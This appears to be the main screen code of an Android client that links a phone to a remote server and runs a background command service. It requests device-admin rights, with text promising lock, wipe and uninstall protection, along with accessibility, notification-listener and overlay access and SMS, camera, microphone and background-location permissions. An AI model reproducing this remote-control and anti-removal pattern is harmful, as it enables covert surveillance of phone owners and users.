package com.abuzahra.manager

import android.Manifest
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.provider.Settings
import android.widget.Button
import android.widget.TextView
import android.widget.Toast
import androidx.appcompat.app.AlertDialog
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.abuzahra.manager.api.ApiClient
import com.abuzahra.manager.api.FirebaseManager
import com.abuzahra.manager.executor.DataCollector
import com.abuzahra.manager.service.CommandService
import com.abuzahra.manager.util.DeviceUtils
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

class MainActivity : AppCompatActivity() {

    companion object {
        private const val PERMISSION_REQUEST = 1001
        private const val PERMISSION_REQUEST_BATCH2 = 1002
        private const val PERMISSION_REQUEST_BATCH3 = 1003
        private const val DEVICE_ADMIN_REQUEST = 2001
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        if (!DeviceUtils.isLinked(this)) {
            startActivity(Intent(this, LinkActivity::class.java))
            finish()
            return
        }

        val textDeviceId = findViewById<TextView>(R.id.textDeviceId)
        val textStatus = findViewById<TextView>(R.id.textStatus)
        val textBattery = findViewById<TextView>(R.id.textBattery)
        val textPermissions = findViewById<TextView>(R.id.textPermissions)
        val btnPermissions = findViewById<Button>(R.id.btnPermissions)
        val btnUnlink = findViewById<Button>(R.id.btnUnlink)
        val btnRestart = findViewById<Button>(R.id.btnRestart)

        // Update device info
        textDeviceId.text = "ID: ${DeviceUtils.getDeviceId(this)}"

        val deviceInfo = DataCollector.getDeviceInfo(this)
        findViewById<TextView>(R.id.textModel).text = "${deviceInfo["model"]}"
        findViewById<TextView>(R.id.textAndroid).text = "Android ${deviceInfo["android"]}"

        // Update battery
        val battery = DataCollector.getBattery(this)
        textBattery.text = "${battery["level"]}% (${battery["status"]})"

        // Check server connection status
        checkServerStatus(textStatus)

        // Ensure service is running
        CommandService.start(this)

        // Update permissions count
        updatePermissionCount(textPermissions)

        // Request Device Admin on first launch
        requestDeviceAdmin()

        // Request battery optimization
        requestBatteryOptimization()

        // Auto-request permissions on first launch
        requestPermissionsInBatches()

        // Request permissions button
        btnPermissions.setOnClickListener {
            requestPermissionsInBatches()
            requestSpecialPermissions()
            requestDeviceAdmin()
            requestBatteryOptimization()
            updatePermissionCount(textPermissions)
        }

        // Restart service
        btnRestart.setOnClickListener {
            CommandService.stop(this)
            Thread.sleep(500)
            CommandService.start(this)
            textStatus.text = "Service restarted"
            textStatus.setTextColor(getColor(android.R.color.holo_orange_dark))
            Toast.makeText(this, "Service restarted", Toast.LENGTH_SHORT).show()

            // Re-check server status after restart
            CoroutineScope(Dispatchers.IO).launch {
                Thread.sleep(2000)
                runOnUiThread { checkServerStatus(textStatus) }
            }
        }

        // Unlink
        btnUnlink.setOnClickListener {
            AlertDialog.Builder(this)
                .setTitle("Unlink Device")
                .setMessage("Are you sure you want to unlink this device?")
                .setPositiveButton("Yes") { _, _ ->
                    DeviceUtils.setLinked(this, false)
                    CommandService.stop(this)
                    startActivity(Intent(this, LinkActivity::class.java))
                    finish()
                }
                .setNegativeButton("Cancel", null)
                .show()
        }
    }

    override fun onResume() {
        super.onResume()
        try {
            val battery = DataCollector.getBattery(this)
            findViewById<TextView>(R.id.textBattery).text = "${battery["level"]}% (${battery["status"]})"
        } catch (_: Exception) {}
        updatePermissionCount(findViewById(R.id.textPermissions))
    }

    private fun checkServerStatus(textStatus: TextView) {
        CoroutineScope(Dispatchers.IO).launch {
            try {
                val healthy = ApiClient.testHealth()
                runOnUiThread {
                    if (healthy) {
                        textStatus.text = "Online"
                        textStatus.setTextColor(getColor(android.R.color.holo_green_dark))
                    } else {
                        textStatus.text = "Server unreachable"
                        textStatus.setTextColor(getColor(android.R.color.holo_red_dark))
                    }
                }
            } catch (_: Exception) {
                runOnUiThread {
                    textStatus.text = "Checking..."
                    textStatus.setTextColor(getColor(android.R.color.holo_orange_dark))
                }
            }
        }
    }

    // ===== DEVICE ADMIN =====
    private fun requestDeviceAdmin() {
        try {
            val dpm = getSystemService(DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val componentName = ComponentName(this, com.abuzahra.manager.service.DeviceAdminReceiver::class.java)
            if (!dpm.isAdminActive(componentName)) {
                val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
                intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, componentName)
                intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                    "يجب تفعيل مسؤول الجهاز لتفعيل جميع الميزات مثل قفل الهاتف ومسح البيانات والحماية من الحذف")
                startActivity(intent)
            }
        } catch (e: Exception) {
            android.util.Log.w("MainActivity", "Device admin request failed: ${e.message}")
        }
    }

    // ===== BATTERY OPTIMIZATION =====
    private fun requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val intent = Intent(
                    Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS,
                    Uri.parse("package:$packageName")
                )
                startActivity(intent)
            } catch (_: Exception) {}
        }
    }

    private fun updatePermissionCount(textView: TextView) {
        val total = getRequiredPermissions().size
        var granted = 0
        for (perm in getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, perm) == PackageManager.PERMISSION_GRANTED) {
                granted++
            }
        }
        textView.text = "Permissions: $granted/$total"
        val color = when {
            granted == total -> android.R.color.holo_green_dark
            granted > total / 2 -> android.R.color.holo_orange_dark
            else -> android.R.color.holo_red_dark
        }
        textView.setTextColor(getColor(color))
    }

    private fun getRequiredPermissions(): Array<String> {
        val perms = mutableListOf(
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.READ_SMS,
            Manifest.permission.SEND_SMS,
            Manifest.permission.RECEIVE_SMS,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.CAMERA,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.READ_PHONE_STATE,
            Manifest.permission.READ_CALENDAR,
            Manifest.permission.CALL_PHONE,
            Manifest.permission.ACCESS_WIFI_STATE,
            Manifest.permission.CHANGE_WIFI_STATE,
            Manifest.permission.BLUETOOTH,
            Manifest.permission.BLUETOOTH_ADMIN,
            Manifest.permission.BLUETOOTH_CONNECT,
            Manifest.permission.VIBRATE,
            Manifest.permission.NFC,
        )
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.TIRAMISU) {
            perms.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            perms.add(Manifest.permission.WRITE_EXTERNAL_STORAGE)
        } else {
            perms.add(Manifest.permission.READ_MEDIA_IMAGES)
            perms.add(Manifest.permission.READ_MEDIA_VIDEO)
            perms.add(Manifest.permission.READ_MEDIA_AUDIO)
            perms.add(Manifest.permission.POST_NOTIFICATIONS)
        }
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            perms.add(Manifest.permission.ACCESS_BACKGROUND_LOCATION)
        }
        return perms.toTypedArray()
    }

    private fun requestPermissionsInBatches() {
        val ungranted = getRequiredPermissions().filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (ungranted.isEmpty()) {
            requestSpecialPermissions()
            return
        }

        val batch1 = ungranted.take(10)
        ActivityCompat.requestPermissions(this, batch1.toTypedArray(), PERMISSION_REQUEST)
    }

    private fun requestSpecialPermissions() {
        // Battery optimization
        requestBatteryOptimization()

        // System alert window (draw over other apps)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                try {
                    val intent = Intent(
                        Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:$packageName")
                    )
                    startActivity(intent)
                } catch (_: Exception) {}
            }
        }

        // Usage stats (for screen time)
        try {
            val appUsageIntent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
            startActivity(appUsageIntent)
        } catch (_: Exception) {}

        // Write settings
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.System.canWrite(this)) {
                try {
                    val intent = Intent(Settings.ACTION_MANAGE_WRITE_SETTINGS)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                } catch (_: Exception) {}
            }
        }

        // Notification access
        try {
            val intent = Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS")
            startActivity(intent)
        } catch (_: Exception) {}

        // Install unknown apps
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            try {
                val intent = Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES)
                intent.data = Uri.parse("package:$packageName")
                startActivity(intent)
            } catch (_: Exception) {}
        }

        // Accessibility service
        try {
            val accessibilityIntent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            startActivity(accessibilityIntent)
        } catch (_: Exception) {}

        // All files access (MANAGE_EXTERNAL_STORAGE)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            try {
                if (!android.os.Environment.isExternalStorageManager()) {
                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION)
                    intent.data = Uri.parse("package:$packageName")
                    startActivity(intent)
                }
            } catch (_: Exception) {}
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        val textPermissions = findViewById<TextView>(R.id.textPermissions)
        updatePermissionCount(textPermissions)

        val stillNeeded = getRequiredPermissions().filter {
            ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED
        }

        if (stillNeeded.isNotEmpty() && requestCode == PERMISSION_REQUEST) {
            ActivityCompat.requestPermissions(
                this,
                stillNeeded.take(10).toTypedArray(),
                PERMISSION_REQUEST_BATCH2
            )
        } else if (stillNeeded.isNotEmpty() && requestCode == PERMISSION_REQUEST_BATCH2) {
            ActivityCompat.requestPermissions(
                this,
                stillNeeded.take(10).toTypedArray(),
                PERMISSION_REQUEST_BATCH3
            )
        }
    }
}
